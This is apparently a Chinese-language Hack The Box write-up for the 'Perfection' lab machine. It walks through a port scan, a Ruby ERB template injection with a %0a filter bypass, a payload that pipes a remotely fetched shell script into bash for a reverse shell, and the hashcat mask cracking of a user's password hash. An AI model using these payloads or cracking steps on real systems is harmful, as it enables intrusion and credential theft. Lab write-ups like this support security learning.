---
layout: post
title: HTB——Perpection
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Perfection/01.png?raw=true)

# 0x01 信息收集

```bash
 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.6  Expired: 2026.01.01
[04:38:23] [INFO] Start IpScan:10.129.104.173
[04:38:23] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[04:38:24] [+] 10.129.104.173:22 open
[04:38:24] [+] 10.129.104.173:80 open                        
[04:38:25] [+] [TCP/SSH]  [OpenSSH 8.9p1 Ubuntu 3ubuntu0.6] 10.129.104.173:22 [SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6]                                                                           
[04:38:25] [INFO] start SSH check 10.129.104.173:22
[04:38:25] [+] 开始 SshScan 任务: SSH://10.129.104.173:22
[04:38:25] [+] [TCP/HTTP] [200] [nginx][Ruby] http://10.129.104.173:80 [Weighted Grade Calculator]
                                                          
[04:38:35] [+] alive ports is: 2
[04:38:35] [+] Ip扫描结束:10.129.104.173
[04:38:35] [INFO] Start UrlScan:http://10.129.104.173:80
[04:38:36] [+] [TCP/HTTP] [200] [nginx][Ruby] http://10.129.104.173:80 [Weighted Grade Calculator]
                                                 
[04:38:36] [+] Url扫描结束:http://10.129.104.173:80
[04:38:36] [+] 项目任务完成:Default, Timeuse：12.825280707
[04:38:36] [+] 扫描结束,耗时: 13.94236363s
```
---

# 0x02  Ruby环境下的SSTI

发现web服务的环境语言是`Ruby`，且SSH的版本号为`8.9p1`.web服务的`/weighted-grade`页面可供我们输入待计算数据，且`category`可以输入字母。那我们尝试使用`%0a`绕过关键词检测，经尝试发现是`Erb`模板的无回显SSTI，尝试远程调用sh脚本来反弹shell

- [PayloadsAllTheThings/Server Side Template Injection/Ruby.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server Side Template Injection/Ruby.md)

```bash
<%= `curl http://10.10.16.7:8089/shell.sh|bash` %>
```

至此我们获得到了`susan`的shell

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Perfection/02.png?raw=true)

---

# 0x03 数据库查找其他用户

在find和sudo无果后，我们将重心转向可能存在的数据库db文件。使用find查找到一个数据库文件。

```bash
susan@perfection:~/ruby_app$ find / -name '*.db' | grep 'db'
/home/susan/Migration/pupilpath_credentials.db
```

查看id发现其在`sudo`组中，但想要调用sudo我们就必须拥有此用户的密码。我们打开db文件，查看到`susan`的密码hash，选用hashcat进行爆破`abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f`

注：在不清楚hash的构成时，我们可以选用kali内的`hash-identifier`来判断hash类型，与`hashcat`配合食用效果更佳。

注意，在`susan`的邮件中提到了密码的构成，此处的`susan`密码并非是常规的rockyou直接爆破，而是以特定结构构成。

```bash
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```

所以我们完整的hashcat指令应为：

```bash
┌──(kali㉿kali)-[~/HTB/machine/Perfection]
└─$ hashcat -m 1400 -a 3 hash1 susan_nasus_?d?d?d?d?d?d?d?d?d?d
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
```

得到密码后我们就可以随便执行sudo了。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Perfection/03.png?raw=true)

---